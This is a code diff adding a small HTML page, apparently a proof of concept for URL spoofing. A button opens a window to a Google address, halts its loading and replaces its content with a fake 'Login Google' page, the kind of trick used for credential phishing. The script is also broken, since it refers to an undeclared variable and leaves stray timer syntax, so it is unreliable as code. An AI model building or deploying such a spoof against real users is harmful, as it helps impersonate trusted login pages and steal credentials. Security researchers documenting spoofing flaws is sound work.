@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
+
+    <script>
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com/csi", "_blank");
+    w.stop();
+    w.document.body.innerHTML = "<h1>Login Google</h1>";
+}, 500);
+</script>
+    
+  </body>
+</html>
